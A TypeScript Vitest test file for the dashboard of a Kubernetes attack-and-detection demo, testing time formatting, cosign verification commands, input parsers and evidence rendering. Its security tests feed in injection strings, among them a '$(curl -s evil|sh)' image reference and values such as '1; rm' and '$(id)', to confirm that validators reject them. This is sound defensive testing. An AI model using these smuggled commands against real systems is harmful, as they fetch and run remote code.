import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { ApiClient } from "../../src/lib/api";
import { type CommandOutcome, type Posture, type StreamEvent, parseBuildInfo, parsePosture, parseProvenance, parseRunList, parseStats, parseTick, toStreamEvent } from "../../src/lib/contract";
import { utc, utcClock, when } from "../../src/lib/dom";
import { posture, stats, TERMINAL_OBJECTIVES } from "../../src/lib/fixtures";
import { COSIGN_IDENTITY_REGEXP, COSIGN_ISSUER, ciRunUrl, commitUrl, cosignVerifyCommand, isPinnedImageRef, rekorSearchUrl } from "../../src/lib/provenance";
import { mountConsole } from "../../src/ui/console";
import { buildTimeline, noDetection } from "../../src/lib/timeline";
import { renderEvidenceCard, renderEvidenceDetail, renderNoAttack, renderTicker, tickerItems } from "../../src/ui/evidence";
import { admissionTone, renderPostureData } from "../../src/ui/posture";
import { renderStats } from "../../src/ui/stats";
import { renderRun } from "../../src/ui/timeline";
import { renderStrip, renderVerifyPanel } from "../../src/ui/verify";

// ADR 0035: absolute times in UTC, the single cosign identity, the parsers of the additions, the
// posture naming its failures, finished runs saying why nothing was detected, and the evidence card.

const T = Date.parse("2026-10-03T18:01:57.123Z");

describe("utc / when (B2-2)", () => {
  it("writes the date, the time and the UTC label, with ms when asked", () => {
    expect(utc(T)).toBe("2026-10-03 18:01:57 UTC");
    expect(utc("2026-10-03T18:01:57.123Z", { ms: true })).toBe("2026-10-03 18:01:57.123 UTC");
    // A zone offset is converted, not dropped.
    expect(utc("2026-10-03T20:01:57+02:00")).toBe("2026-10-03 18:01:57 UTC");
  });

  it("drops the date only on the same UTC day", () => {
    expect(utcClock(T, T + 3600_000)).toBe("18:01:57 UTC");
    expect(utcClock(T, Date.parse("2026-10-04T00:00:01Z"))).toBe("2026-10-03 18:01:57 UTC");
    expect(utcClock(T, T, { ms: true })).toBe("18:01:57.123 UTC");
  });

  it("puts the relative time after the absolute one", () => {
    expect(when("2026-10-03T12:01:57Z", T)).toBe("12:01:57 UTC (6 hours ago)");
    expect(when("2026-10-01T18:01:57Z", T)).toBe("2026-10-01 18:01:57 UTC (2 days ago)");
    expect(when(null, T)).toBe("never");
  });
});

describe("provenance.ts (B3)", () => {
  // Character for character the default of scripts/verify-image.sh (IDENTITY_REGEXP, :40).
  const VERIFY_IMAGE_REGEXP = "^https://github\\.com/HubertMJ/self-defending-portfolio/\\.github/workflows/(build-images|build-web)\\.yml@refs/heads/main$";

  it("uses verify-image.sh's identity and issuer", () => {
    expect(COSIGN_IDENTITY_REGEXP).toBe(VERIFY_IMAGE_REGEXP);
    expect(COSIGN_ISSUER).toBe("https://token.actions.githubusercontent.com");
    const img = `ghcr.io/hubertmj/self-defending-portfolio/api@sha256:${"a".repeat(64)}`;
    expect(cosignVerifyCommand(img)).toBe(`cosign verify ${img} \\\n  --certificate-identity-regexp '${VERIFY_IMAGE_REGEXP}' \\\n  --certificate-oidc-issuer https://token.actions.githubusercontent.com`);
  });

  it("builds exact links and refuses anything else", () => {
    const d = `sha256:${"0123456789abcdef".repeat(4)}`;
    expect(rekorSearchUrl(d)).toBe(`https://search.sigstore.dev/?hash=${d}`);
    expect(rekorSearchUrl("sha256:xyz")).toBeNull();
    expect(commitUrl("0448cff")).toBe("https://github.com/HubertMJ/self-defending-portfolio/commit/0448cff");
    expect(commitUrl("../evil")).toBeNull();
    expect(ciRunUrl("18234567890")).toBe("https://github.com/HubertMJ/self-defending-portfolio/actions/runs/18234567890");
    expect(ciRunUrl("1; rm")).toBeNull();
  });

  it("is the console's only copy of the cosign command", () => {
    const src = readFileSync(join(process.cwd(), "src", "ui", "console.ts"), "utf8");
    expect(src).toContain("cosignVerifyCommand(image)");
    expect(src).not.toMatch(/--certificate-identity\b(?!-regexp)/);
  });

  it("shows what is known when provenance is missing, without throwing", () => {
    const strip = renderStrip({ provenance: null, build: { commit: "a".repeat(40), ci_run_id: "7" } });
    expect(strip.textContent).toContain("API provenance unavailable");
    expect(strip.querySelector('[data-image="web"]')?.textContent).toContain("aaaaaaa");
    expect(strip.querySelector('[data-image="api"]')).toBeNull();
    const panel = renderVerifyPanel({ provenance: null, build: null });
    expect(panel.textContent).toContain("API provenance unavailable");
    expect(panel.querySelectorAll(".vraw__row").length).toBeGreaterThanOrEqual(9);
  });

  it("strip: short commit and digest, full digest in the title, cosign and Rekor per image", () => {
    const api = `ghcr.io/hubertmj/self-defending-portfolio/api@sha256:be0895f4${"0".repeat(56)}`;
    const strip = renderStrip({ provenance: { api: { commit: "0448cff5a1", ci_run_id: "9", images: [api] }, web: { images: [] } }, build: null });
    const row = strip.querySelector('[data-image="api"]') as HTMLElement;
    expect(row.textContent).toContain("0448cff");
    expect(row.querySelector(".vstrip__digest")?.textContent).toBe("sha256:be0895f4…");
    expect(row.querySelector(".vstrip__digest")?.getAttribute("title")).toBe(`sha256:be0895f4${"0".repeat(56)}`);
    expect(row.querySelector('a[href^="https://search.sigstore.dev/?hash=sha256:be0895f4"]')).not.toBeNull();
    expect(row.textContent).toContain("Copy cosign");
  });
});

describe("parsers of the ADR 0035 additions", () => {
  it("stats: last_run_at and last_24h, all or nothing, absent on an old API", () => {
    const old = parseStats(stats(0));
    expect(old.last_run_at).toBeUndefined();
    expect(old.last_24h).toBeUndefined();
    const w = { since: "2026-10-03T19:05:00Z", runs: 3, detected: 2, responded: 1, falco_alerts: 4, talon_actions: 2 };
    const ok = parseStats({ ...stats(0), last_run_at: "2026-10-03T18:00:00Z", last_24h: w });
    expect(ok.last_run_at).toBe("2026-10-03T18:00:00Z");
    expect(ok.last_24h).toEqual(w);
    const bad = parseStats({ ...stats(0), last_run_at: "yesterday", last_24h: { ...w, runs: -1 } });
    expect(bad.last_run_at).toBeUndefined();
    expect(bad.last_24h).toBeUndefined();
    expect(parseStats({ ...stats(0), last_24h: { ...w, since: 5 } }).last_24h).toBeUndefined();
  });

  it("posture: malformed violations and checks are dropped, caps hold, running is never guessed", () => {
    const p = posture(0);
    const v = { policy: "p", rule: "r", kind: "ReplicaSet", namespace: "falco-response", count: 7, running: false, file: "cluster/x.yaml" };
    const parsed = parsePosture({
      ...p,
      kyverno: { ...p.kyverno, violations: [v, { ...v, count: "7" }, { ...v, running: "no", file: "https://evil" }, ...Array.from({ length: 60 }, () => v)] },
      kube_bench: { ...p.kube_bench, failing: [{ id: "1.1.9", title: "t".repeat(500), remediation: "r" }, { id: "1.1.9; rm", title: "x" }, { id: "1.2.26", title: "y", audit: "secret" }] },
      trivy: { ...p.trivy, last_scan: "not a time" },
      falco: { alerts_24h: 1, counted_since: "2026-10-03T19:05:00Z" },
    });
    expect(parsed.kyverno.violations).toHaveLength(49); // 50 kept, the string count dropped
    expect(parsed.kyverno.violations_truncated).toBe(true);
    expect(parsed.kyverno.violations_incomplete).toBe(true);
    expect(parsed.kyverno.violations?.[1]).toMatchObject({ running: null, file: "" });
    expect(parsed.kube_bench.failing?.map((c) => c.id)).toEqual(["1.1.9", "1.2.26"]);
    expect(parsed.kube_bench.failing?.[0].title.length).toBe(200);
    expect(JSON.stringify(parsed)).not.toContain("secret");
    expect(parsed.trivy.last_scan).toBeUndefined();
    expect(parsed.falco.counted_since).toBe("2026-10-03T19:05:00Z");
  });

  it("provenance: only own api/web images by digest; bad commit and run id become empty", () => {
    const api = `ghcr.io/hubertmj/self-defending-portfolio/api@sha256:${"a".repeat(64)}`;
    const p = parseProvenance({
      api: { commit: "ZZZ", ci_run_id: "12a", images: [api, api, `ghcr.io/hubertmj/self-defending-portfolio/api-x@sha256:${"a".repeat(64)}`, "ghcr.io/evil/api@sha256:00", `ghcr.io/hubertmj/self-defending-portfolio/web@sha256:${"b".repeat(64)}`] },
      web: { images: [`ghcr.io/hubertmj/self-defending-portfolio/web@sha256:${"b".repeat(64)}`, 7] },
    });
    expect(p.api).toEqual({ commit: "", ci_run_id: "", images: [api] });
    expect(p.web.images).toHaveLength(1);
    expect(() => parseProvenance("x")).toThrow();
    expect(parseBuildInfo({ commit: "abc", ci_run_id: "1" })).toEqual({ commit: "", ci_run_id: "1" });
  });

  it("runs list and tick: malformed entries dropped; a __proto__ key is harmless", () => {
    const runs = parseRunList({ runs: [{ run_id: "0123456789abcdef", scenario: "terminal", state: "finished", started_at: "2026-10-03T18:00:00Z", ended_at: null, detected: false, responded: false, events: 9, truncated: false }, { run_id: "../x", scenario: "t", state: "finished", started_at: "2026-10-03T18:00:00Z" }] });
    expect(runs.map((r) => r.run_id)).toEqual(["0123456789abcdef"]);
    expect(parseTick('{"at":"2026-10-03T18:00:00.123456789Z","started_at":"x"}')).toEqual({ at: "2026-10-03T18:00:00.123456789Z" });
    expect(parseTick("{}")).toBeNull();
    const s = parseStats(JSON.parse('{"runs":1,"by_scenario":{"__proto__":{"runs":5,"detected":5,"responded":5}}}'));
    expect(Object.getPrototypeOf(s.by_scenario)).toBe(Object.prototype);
  });
});

const withViolations = (rows: { running: boolean | null; count: number }[], extra: Partial<Posture["kyverno"]> = {}): Posture => {
  const p = posture(0);
  const fail = rows.reduce((a, r) => a + r.count, 0);
  return {
    ...p,
    kyverno: {
      policies: [...p.kyverno.policies.map((x) => ({ ...x, fail: 0 })), { name: "restrict-image-registries", pass: 1, fail, warn: 0 }],
      violations: rows.map((r) => ({ policy: "restrict-image-registries", rule: "autogen-validate-registries", kind: "ReplicaSet", namespace: "falco-response", file: "cluster/infra/kyverno-policies/restrict-image-registries.yaml", ...r })),
      ...extra,
    },
  };
};

describe("posture names its failures (B2-3)", () => {
  it("absent additions render as before: no list, no extra table, the old Runtime label", () => {
    const el = renderPostureData(posture(0), 0);
    expect(el.querySelectorAll(".tile__list")).toHaveLength(0);
    expect(el.querySelectorAll("table")).toHaveLength(2);
    expect(el.textContent).toContain("Runtime, last 24 h");
    expect(el.querySelector(".tile")?.className).toContain("tile--critical");
  });

  it("amber only when every group runs nothing; red with any true or null; the count unchanged", () => {
    const amber = withViolations([{ running: false, count: 4 }, { running: false, count: 3 }]);
    expect(admissionTone(amber)).toBe("warning");
    const el = renderPostureData(amber, 0, "0448cff");
    const tile = el.querySelector(".tile") as HTMLElement;
    expect(tile.className).toContain("tile--warning");
    expect(tile.querySelector(".tile__value")?.textContent).toBe("7 violations");
    expect(tile.textContent).toContain("stale config, nothing running violates");
    expect(tile.textContent).toContain("4 × restrict-image-registries / autogen-validate-registries on ReplicaSet in falco-response - 0 running: old revisions kept at 0 replicas");
    expect(tile.querySelector("a")?.getAttribute("href")).toBe("https://github.com/HubertMJ/self-defending-portfolio/blob/0448cff/cluster/infra/kyverno-policies/restrict-image-registries.yaml");
    expect(admissionTone(withViolations([{ running: false, count: 4 }, { running: true, count: 3 }]))).toBe("critical");
    expect(admissionTone(withViolations([{ running: false, count: 4 }, { running: null, count: 3 }]))).toBe("critical");
    expect(admissionTone(withViolations([{ running: false, count: 4 }], { violations_truncated: true }))).toBe("critical");
    const red = renderPostureData(withViolations([{ running: null, count: 7 }]), 0);
    expect(red.querySelector(".tile")?.className).toContain("tile--critical");
    expect(red.querySelector(".tile__value")?.textContent).toBe("7 violations");
  });

  it("lists failing CIS checks with the remediation open, and dates the scans in UTC", () => {
    const p = posture(T);
    const el = renderPostureData(
      { ...p, kube_bench: { ...p.kube_bench, failing: [{ id: "1.1.9", title: "CNI file permissions", remediation: "chmod 600" }] }, trivy: { ...p.trivy, last_scan: "2026-10-03T15:10:31Z" }, falco: { ...p.falco, counted_since: "2026-10-03T17:00:00Z" } },
      T,
    );
    const details = el.querySelector(".tile__remedy") as HTMLDetailsElement;
    expect(details.open).toBe(true);
    expect(details.closest("li")?.textContent).toContain("1.1.9 CNI file permissions");
    expect(el.textContent).toContain("last scan 15:10:31 UTC (3 hours ago)");
    expect(el.textContent).toContain("counted since 17:00:00 UTC");
    expect(el.textContent).not.toContain("Runtime, last 24 h");
    expect(el.querySelector(".panel-foot time")?.textContent).toMatch(/UTC \(/);
  });
});

const at = (ms: number) => new Date(T + ms).toISOString();
const ev = (type: string, data: Record<string, unknown>, id?: number): StreamEvent => toStreamEvent(type, data, id) as StreamEvent;
const termRun = (cmds: string[], extra: StreamEvent[] = [], end = true): StreamEvent[] => [
  ev("run", { run_id: "0123456789abcdef", scenario: "terminal", state: "queued", at: at(0) }),
  ev("run", { run_id: "0123456789abcdef", scenario: "terminal", state: "started", at: at(10), pod: "terminal-0123456789" }),
  ...cmds.flatMap((id, i) => [ev("command", { run_id: "0123456789abcdef", seq: i + 1, id, state: "started", at: at(100 + i) }), ev("command", { run_id: "0123456789abcdef", seq: i + 1, id, state: "exited", at: at(200 + i), exit_code: 0 })]),
  ...extra,
  ...(end ? [ev("run", { run_id: "0123456789abcdef", scenario: "terminal", state: "finished", at: at(5000), detail: "left" })] : []),
];
const OUTCOMES = new Map<string, CommandOutcome>([["whoami", "allowed"], ["hostname", "allowed"], ["touch-bin", "prevented"], ["read-shadow", "detected"]]);

describe("why a finished run shows no detection (B2-4)", () => {
  const run = (events: StreamEvent[]) => buildTimeline(events, T + 6000).runs[0];
  const stages = (events: StreamEvent[], outcomes: ReadonlyMap<string, CommandOutcome> | undefined = OUTCOMES) => {
    const el = renderRun(run(events), "Attacker's terminal", new Set(), undefined, undefined, outcomes, T + 6000);
    const s = (k: string) => el.querySelector(`.stage--${k}`) as HTMLElement;
    return { el, detect: s("detect"), respond: s("respond") };
  };

  it("recon only: both stages not applicable, never pending", () => {
    expect(noDetection(run(termRun(["whoami", "hostname"])), OUTCOMES)).toBe("recon");
    const { el, detect, respond } = stages(termRun(["whoami", "hostname"]));
    expect(detect.dataset.reached).toBe("na");
    expect(detect.textContent).toContain("No detection expected");
    expect(detect.textContent).toContain("recon only - no detection expected");
    expect(respond.dataset.reached).toBe("na");
    expect(respond.textContent).toContain("No response needed");
    expect(el.textContent).not.toContain("pending");
    expect(el.querySelector('[data-reached="false"]')).toBeNull();
  });

  it("a preventive layer, no commands, a miss, an unknown catalogue", () => {
    const prevented = stages(termRun(["whoami", "touch-bin"]));
    expect(prevented.detect.dataset.reached).toBe("na");
    expect(prevented.detect.textContent).toContain("recon and commands blocked by a preventive layer");
    const none = stages(termRun([]));
    expect(none.detect.textContent).toContain("No commands run");
    expect(none.respond.dataset.reached).toBe("na");
    const missed = stages(termRun(["whoami", "read-shadow"]));
    expect(missed.detect.dataset.reached).toBe("missed");
    expect(missed.detect.textContent).toContain("Detection expected, none arrived");
    expect(missed.respond.dataset.reached).toBe("false");
    const unknown = stages(termRun(["whoami"]), new Map());
    expect(unknown.detect.dataset.reached).toBe("false");
    expect(unknown.detect.textContent).toContain("(not reached)");
    expect(unknown.detect.textContent).not.toContain("pending");
  });

  it("a scripted run that ended undetected is not reached; an active run is pending", () => {
    const scripted = [ev("run", { run_id: "r1", scenario: "network-tool", state: "started", at: at(0) }), ev("run", { run_id: "r1", scenario: "network-tool", state: "failed", at: at(500), detail: "x" })];
    expect(noDetection(run(scripted), OUTCOMES)).toBe("not-reached");
    const active = stages(termRun(["whoami"], [], false));
    expect(active.detect.dataset.reached).toBe("false");
    expect(active.detect.textContent).toContain("(pending)");
    expect(active.respond.textContent).toContain("(pending)");
  });

  it("history rows carry UTC with ms and a raw JSON link for a valid run id only", () => {
    const { el } = stages(termRun(["whoami"]));
    expect(el.querySelector(".stage__at")?.textContent).toBe("18:01:57.133 UTC");
    expect(el.querySelector('a[href="/api/runs/0123456789abcdef"]')?.getAttribute("target")).toBe("_blank");
    const bad = renderRun({ ...run(termRun(["whoami"])), runId: "../x" }, "t", new Set(), undefined, undefined, OUTCOMES, T + 6000);
    expect(bad.querySelector('a[href^="/api/runs/"]')).toBeNull();
  });
});

const POD = "scenario-shell-in-container-abc";
const scripted = (n: number): StreamEvent[] => [
  ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "queued", at: at(0) }, 1),
  ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "started", at: at(50), pod: POD }, 2),
  ...Array.from({ length: n }, (_, i) =>
    ev("falco", { at: at(1000 + i * 10), rule: `Rule ${i}`, priority: "Notice", namespace: "sandbox", pod: POD, output: "o", fields: { "proc.name": "sh", "k8s.ns.name": "sandbox", "secret.field": "nope" }, api_received_at: at(1020 + i * 10) }, 10 + i),
  ),
  ev("talon", { at: at(2000), action: "Terminate Pod", actionner: "kubernetes:terminate", namespace: "sandbox", pod: POD, status: "success", output: "terminated" }, 50),
  ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "finished", at: at(3000) }, 51),
];

describe("the evidence card, the ticker and the hero's last run (B4)", () => {
  it("shows at most 3 Falco/Talon events, then 'N more - raw JSON'", () => {
    const run = buildTimeline(scripted(5), T + 4000).runs[0];
    const card = renderEvidenceCard(run, { title: "Shell in a container", now: T + 4000 });
    expect(card.querySelectorAll(".evlist__item")).toHaveLength(3);
    const more = card.querySelector('a[href="/api/runs/0f0e0d0c0b0a0908"]');
    expect(more?.textContent).toContain("3 more - raw JSON");
    expect(card.textContent).toContain(POD);
    expect(card.textContent).toContain("last attack 18:01:57 UTC");
    expect(card.querySelector("details")).toBeNull();
    // An invalid run id never becomes a link.
    expect(renderEvidenceCard({ ...run, runId: "a/b" }, { title: "x", now: T }).querySelector('a[href^="/api/runs/"]')).toBeNull();
  });

  it("the full record shows only allow-listed Falco fields", () => {
    const run = buildTimeline(scripted(1), T + 4000).runs[0];
    // Bypass the parser: the renderer filters again.
    run.falco[0].fields = { ...run.falco[0].fields, "secret.field": "nope" };
    const d = renderEvidenceDetail(run, { title: "x", now: T + 4000 });
    expect(d.textContent).toContain("proc.name");
    expect(d.textContent).not.toContain("secret.field");
  });

  it("the ticker lists only real events, newest first, and says when nothing happened", () => {
    const view = buildTimeline(scripted(2), T + 4000);
    const items = tickerItems(view);
    expect(items.map((i) => i.text)).toEqual(["shell-in-container: Finished", "Talon: Talon deleted the pod (success)", "Falco: Rule 1", "Falco: Rule 0", "shell-in-container: Attack running", "shell-in-container: Queued"]);
    expect(tickerItems(view, 3)).toHaveLength(3);
    const empty = renderTicker([], { now: T, since: T - 60_000, connected: true, tickAt: at(0) });
    expect(empty.textContent).toBe("No events since 2026-10-03 18:00:57 UTC; the stream is connected (server time 2026-10-03 18:01:57 UTC).");
    expect(tickerItems(buildTimeline([], T))).toEqual([]);
  });

  it("no run in memory: when the API started and the last recorded attack, and a way to #attack", () => {
    const el = renderNoAttack({ apiStartedAt: "2026-10-03T17:00:00Z", lastRunAt: "2026-10-03T12:01:57Z", now: T });
    expect(el.textContent).toContain("No attack since the API started at 2026-10-03 17:00:00 UTC - last attack recorded 12:01:57 UTC (6 hours ago).");
    expect(el.querySelector('a[href="#attack"]')).not.toBeNull();
  });

  it("the hero's last-run tile falls back to the API's last_run_at", () => {
    const el = renderStats({ ...stats(T), last_run_at: "2026-10-03T12:01:57Z" }, TERMINAL_OBJECTIVES, undefined, T);
    const tile = el.querySelector(".herostats__tile") as HTMLElement;
    expect(tile.querySelector(".herostats__name")?.textContent).toBe("last run");
    expect(tile.querySelector(".herostats__value")?.textContent).toBe("12:01:57 UTC");
    expect(tile.querySelector(".herostats__foot")?.textContent).toBe("6 hours ago");
    expect(el.textContent).toMatch(/since 2026-08-28 18:01:57 UTC \(\d+ days ago\)/);
  });
});

describe("ApiClient reads the new endpoints, and /build.json outside /api", () => {
  it("asks /build.json at the site root and /api/provenance under the base", async () => {
    const asked: string[] = [];
    const api = new ApiClient({ fetch: async (u) => (asked.push(u), new Response(JSON.stringify({ commit: "", ci_run_id: "" }), { headers: { "Content-Type": "application/json" } })) });
    await api.buildInfo();
    await api.provenance();
    expect(asked).toEqual(["/build.json", "/api/provenance"]);
  });
});

const HEX = "0123456789abcdef".repeat(4);
const EVIL = `$(curl -s evil|sh)x@sha256:${HEX}`;
const GOOD = `ghcr.io/hubertmj/self-defending-portfolio/scenario@sha256:${HEX}`;

describe("a copied cosign command names only a strictly validated pinned image (security review, LOW)", () => {
  it("isPinnedImageRef accepts registry[:port]/path@sha256 and nothing else; the builder throws", () => {
    expect(isPinnedImageRef(GOOD)).toBe(true);
    expect(isPinnedImageRef(`registry.local:5000/a/b-c@sha256:${HEX}`)).toBe(true);
    for (const bad of [EVIL, `$(id) ghcr.io/x/y@sha256:${HEX}`, `ghcr.io/x/y:tag`, `ghcr.io/X/y@sha256:${HEX}`, `ghcr.io/x/y@sha256:${HEX} --insecure`, `ghcr.io/x/y@sha256:${HEX}\n`, `y@sha256:${HEX}`, `${"a/".repeat(150)}b@sha256:${HEX}`]) {
      expect(isPinnedImageRef(bad), bad).toBe(false);
    }
    expect(() => cosignVerifyCommand(EVIL)).toThrow();
  });

  const runWithImage = (image: string) =>
    buildTimeline(
      [
        ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "started", at: at(0), pod: POD }, 1),
        ev("pod", { run_id: "0f0e0d0c0b0a0908", pod: POD, uid: "u", phase: "Running", reason: "", container_id: "9b2e7c4d1a0f", image, labels_delta: {}, deleted: false, at: at(10) }, 2),
        ev("run", { run_id: "0f0e0d0c0b0a0908", scenario: "shell-in-container", state: "finished", at: at(3000) }, 3),
      ],
      T + 4000,
    );

  it("the evidence record: no command and no copy button for a forged image", () => {
    const ok = renderEvidenceDetail(runWithImage(GOOD).runs[0], { title: "x", now: T + 4000 });
    expect(ok.querySelectorAll(".cmd .copy")).toHaveLength(1);
    const evil = renderEvidenceDetail(runWithImage(EVIL).runs[0], { title: "x", now: T + 4000 });
    expect(evil.querySelector(".cmd")).toBeNull();
    expect(evil.querySelector(".copy")).toBeNull();
  });

  it("the live run console: no command and no copy button for a forged image", () => {
    const api = new ApiClient({ fetch: async () => new Response("{}", { status: 404, headers: { "Content-Type": "application/json" } }) });
    const cmds = (image: string) => {
      const root = document.createElement("section");
      document.body.append(root);
      mountConsole(root, api).update(runWithImage(image));
      return root.querySelectorAll(".verify .cmd");
    };
    expect(cmds(GOOD)).toHaveLength(1);
    expect(cmds(EVIL)).toHaveLength(0);
  });

  it("the verify strip and panel: no Copy cosign for a forged image", () => {
    const d = { provenance: { api: { commit: "", ci_run_id: "", images: [EVIL] }, web: { images: [] } }, build: null };
    expect(renderStrip(d).textContent).not.toContain("Copy cosign");
    expect(renderVerifyPanel(d).querySelector(".cmd")).toBeNull();
  });
});
